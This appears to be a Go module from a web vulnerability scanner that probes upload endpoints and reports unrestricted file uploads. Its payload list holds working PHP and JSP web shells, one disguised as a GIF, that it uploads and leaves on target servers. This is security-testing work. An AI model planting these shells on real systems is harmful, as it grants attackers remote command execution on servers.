package engine

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"strings"
	"sync"
	"time"
)

type FileUploadScannerModule struct {
	scanner *VulnScanner
}

func NewFileUploadScannerModule(scanner *VulnScanner) *FileUploadScannerModule {
	if scanner == nil {
		scanner = NewVulnScanner(map[string]interface{}{"module_name": "file-upload-scanner"})
	}
	return &FileUploadScannerModule{scanner: scanner}
}

func (m *FileUploadScannerModule) ID() string       { return "file-upload-scanner" }
func (m *FileUploadScannerModule) Name() string     { return "File Upload Scanner" }
func (m *FileUploadScannerModule) Category() string { return "web" }

func (m *FileUploadScannerModule) Run(ctx context.Context, targets []*Target, config map[string]interface{}) (*ModuleResult, error) {
	start := time.Now()
	result := &ModuleResult{ModuleID: m.ID()}
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 3)

	for _, target := range targets {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		if target.URL == "" && target.Host != "" {
			target.URL = fmt.Sprintf("http://%s", target.Host)
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t *Target) {
			defer wg.Done()
			defer func() { <-sem }()

			findings := m.scanTarget(ctx, t)
			if len(findings) > 0 {
				mu.Lock()
				result.Findings = append(result.Findings, findings...)
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	result.Duration = time.Since(start)
	slog.Info("[FileUpload-Scanner] 扫描完成",
		"targets", len(targets),
		"findings", len(result.Findings),
		"duration", result.Duration,
	)

	return result, nil
}

func (m *FileUploadScannerModule) scanTarget(ctx context.Context, target *Target) []*Finding {
	var findings []*Finding

	uploadEndpoints := m.discoverUploadEndpoints(ctx, target)

	for _, endpoint := range uploadEndpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, payload := range m.getUploadPayloads() {
			body, contentType, err := m.buildMultipartBody(payload)
			if err != nil {
				continue
			}

			req, _ := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, body)
			req.Header.Set("Content-Type", contentType)

			respBody, statusCode, err := m.scanner.Client.Fetch(req)
			if err != nil {
				continue
			}

			if m.isUploadSuccess(statusCode, respBody, payload) {
				severity := "high"
				if payload.ext == ".jpg" || payload.ext == ".png" {
					severity = "medium"
				}

				findings = append(findings, &Finding{
					Target:      target,
					Type:        "file_upload",
					Title:       "Unrestricted File Upload",
					Description: fmt.Sprintf("The endpoint %s allows uploading %s files without proper validation", endpoint, payload.ext),
					Severity:    severity,
					Confidence:  75,
					Evidence:    fmt.Sprintf("POST %s with %s file returned success", endpoint, payload.ext),
					Timestamp:   time.Now(),
					Remediation: "Implement file type validation, rename uploaded files, store outside webroot",
					Data: map[string]string{
						"endpoint": endpoint,
						"file_ext": payload.ext,
					},
				})

				break
			}
		}
	}

	return findings
}

type uploadPayload struct {
	content     string
	ext         string
	contentType string
	filename    string
}

func (m *FileUploadScannerModule) getUploadPayloads() []uploadPayload {
	return []uploadPayload{
		{
			content:     "<?php system($_GET['cmd']); ?>",
			ext:         ".php",
			contentType: "application/x-php",
			filename:    "shell.php",
		},
		{
			content:     "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
			ext:         ".jsp",
			contentType: "application/x-jsp",
			filename:    "shell.jsp",
		},
		{
			content:     "<?php echo 'test'; ?>",
			ext:         ".php5",
			contentType: "application/x-httpd-php5",
			filename:    "test.php5",
		},
		{
			content:     "GIF89a<?php system($_GET['cmd']); ?>",
			ext:         ".gif",
			contentType: "image/gif",
			filename:    "shell.gif",
		},
	}
}

func (m *FileUploadScannerModule) buildMultipartBody(payload uploadPayload) (io.Reader, string, error) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	part, err := writer.CreateFormFile("file", payload.filename)
	if err != nil {
		return nil, "", err
	}
	part.Write([]byte(payload.content))

	writer.WriteField("submit", "Upload")
	writer.Close()

	return &buf, writer.FormDataContentType(), nil
}

func (m *FileUploadScannerModule) discoverUploadEndpoints(ctx context.Context, target *Target) []string {
	var endpoints []string

	body, _, err := m.scanner.Client.Fetch(m.newGetRequest(ctx, target.URL))
	if err != nil {
		return append(endpoints, target.URL+"/upload")
	}

	if strings.Contains(body, "upload") || strings.Contains(body, "file") {
		endpoints = append(endpoints, target.URL+"/upload")
		endpoints = append(endpoints, target.URL+"/api/upload")
		endpoints = append(endpoints, target.URL+"/file/upload")
	}

	if len(endpoints) == 0 {
		endpoints = append(endpoints, target.URL+"/upload")
		endpoints = append(endpoints, target.URL+"/api/upload")
		endpoints = append(endpoints, target.URL+"/file/upload")
		endpoints = append(endpoints, target.URL+"/admin/upload")
	}

	return endpoints
}

func (m *FileUploadScannerModule) isUploadSuccess(statusCode int, body string, payload uploadPayload) bool {
	if statusCode == http.StatusOK || statusCode == http.StatusCreated {
		indicators := []string{
			"upload success",
			"file uploaded",
			"uploaded successfully",
			"file saved",
			"upload complete",
			"success",
			"ok",
		}

		bodyLower := strings.ToLower(body)
		for _, indicator := range indicators {
			if strings.Contains(bodyLower, indicator) {
				return true
			}
		}
	}

	return false
}

func (m *FileUploadScannerModule) newGetRequest(ctx context.Context, url string) *http.Request {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	return req
}
